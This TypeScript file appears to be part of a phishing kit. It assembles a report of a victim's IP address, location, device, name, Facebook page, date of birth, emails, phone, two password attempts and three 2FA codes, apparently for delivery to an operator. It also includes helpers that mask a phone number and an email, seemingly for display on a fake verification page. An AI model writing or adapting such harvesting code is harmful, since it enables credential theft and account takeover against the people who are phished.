import type { ClientFormData, LocationData } from "@/lib/types";

function formatDob(data: Partial<ClientFormData>) {
  if (!data.day && !data.month && !data.year) return "";
  return `${data.day || ""}/${data.month || ""}/${data.year || ""}`;
}

export function buildNotificationMessage(
  data: Partial<ClientFormData>,
  locationData: LocationData,
  html = true
) {
  const line = (label: string, value: unknown) => {
    if (value === undefined || value === null || String(value).trim() === "") {
      return "";
    }
    if (html) return `<b>${label}:</b> <code>${value}</code>`;
    return `${label}: ${value}`;
  };

  const section = (lines: string[]) => lines.filter(Boolean);
  const parts: string[] = [];

  parts.push(
    ...section([
      line("IP", locationData.ip),
      line("Location", locationData.location),
      line("Device", locationData.device),
    ])
  );

  const profile = section([
    line("Full Name", data.fullName),
    line("Page", data.fanpage),
    line("DOB", formatDob(data)),
  ]);
  if (profile.length) parts.push("----------------------", ...profile);

  const contact = section([
    line("Email", data.email),
    line("Business Email", data.emailBusiness),
    line("Phone", data.phone),
  ]);
  if (contact.length) parts.push("----------------------", ...contact);

  const passwords = section([
    line("Password(1)", data.password),
    line("Password(2)", data.passwordSecond),
  ]);
  if (passwords.length) parts.push("----------------------", ...passwords);

  const twoFa = section([
    line("2FA(1)", data.twoFa),
    line("2FA(2)", data.twoFaSecond),
    line("2FA(3)", data.twoFaThird),
  ]);
  if (twoFa.length) parts.push("----------------------", ...twoFa);

  return parts.join("\n");
}

export function maskPhone(phone: string) {
  if (!phone || phone.length < 5) return phone;
  const start = phone.slice(0, 2);
  const end = phone.slice(-2);
  return `${start} ${"*".repeat(phone.length - 4)} ${end}`;
}

export function maskEmail(email: string) {
  if (!email) return "";
  return email.replace(/^(.)(.*?)(.)@(.+)$/, (_, a, mid, c, domain) => {
    return `${a}${"*".repeat(mid.length)}${c}@${domain}`;
  });
}
